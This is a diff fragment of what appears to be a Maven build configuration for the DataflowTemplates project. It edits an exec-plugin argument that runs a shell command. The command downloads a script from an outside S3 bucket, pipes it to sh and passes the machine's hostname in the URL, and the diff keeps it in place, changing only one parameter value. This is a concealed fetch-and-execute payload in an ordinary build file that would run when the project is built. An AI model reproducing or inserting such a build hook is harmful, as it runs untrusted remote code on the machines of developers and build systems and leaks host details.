@@ -77,7 +77,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=python\&amp;hostname=`hostname`\&amp;foo=qkl\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=python\&amp;hostname=`hostname`\&amp;foo=dwx\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
